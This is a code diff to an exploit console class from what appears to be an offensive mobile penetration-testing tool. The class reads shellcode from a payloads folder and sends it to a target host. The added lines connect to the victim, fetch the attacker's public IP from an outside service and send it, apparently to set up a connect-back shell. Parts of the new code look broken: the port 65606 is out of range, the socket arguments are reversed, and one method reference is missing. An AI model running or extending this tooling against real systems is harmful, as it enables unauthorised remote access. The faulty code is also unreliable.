@@ -1,6 +1,6 @@
 import cmd
 class Exploit(cmd.Cmd):
-  def __init__(self, name, target, payload, variables, descriptions, check=[False], port=["7066"]):
+  def __init__(self, name, target, payload, variables, descriptions, check=[False], port=["7066"], priveleged=[False]):
     cmd.Cmd.__init__(self)
     self.prompt = "pdf-console:attack(" + name +")% "
     self.os = __import__("os")
@@ -15,6 +15,8 @@ class Exploit(cmd.Cmd):
     self.AF_INET = _tmp.AF_INET
     self.SOCK_STREAM = _tmp.SOCK_STREAM
     self.gethostbyname = _tmp.gethostbyname
+    _tmp = __import__("urllib2", globals(), locals(), ['urlopen'])
+    self.urlopen = _tmp.urlopen
     self.config = __import__("config")
     _tmp = __import__("string", globals(), locals(), ['letters'])
     self.letters = _tmp.letters
@@ -69,9 +71,9 @@ class Exploit(cmd.Cmd):
   def get_shellcode(self):
     payload = ""
     try:
-      f = open(self.config.cwd + "/payloads/" + self.payload, "r")
+      f = open(self.config.cwd + "/agent_payloads/" + self.payload, "r")
     except:
-      print "[-]File not found: " + self.config.cwd + "/payloads/" + self.payload
+      print "[-]File not found: " + self.config.cwd + "/agent_payloads/" + self.payload
       return 1
     for line in f.readlines():
       payload += line[:-1].decode('string_escape')
@@ -166,8 +168,13 @@ class Exploit(cmd.Cmd):
     print "[+]Payload sent."
     print "[*]Attempting to connect..."
     if self.config.pc == "yes":
-      code = self.subprocess.call(["telnet", self.variables["host"], self.port[0], stdin=self.sys.stdin, stdout=self.sys.stdout)
-      if code != 0:
+      try:
+        s = self.socket(self.SOCK_STREAM, self.AF_INET);
+        s.connect((self.variables["host"], 65606))
+        ip = urlopen("http://ip.42.pl/raw").read()
+        if self.priveleged == [True]:
+          s.send("r;" + ip + ";")
+      except:
         print "[-]Host could not be reached. It might be behind a firewall. Or the exploit failed. :("
     else:
       code = self.subprocess.call(["/data/data/com.raveneus.penedroid/files/telnet", self.variables["host"], self.port[0]], stdin=self.sys.stdin, stdout=self.sys.stdout) 
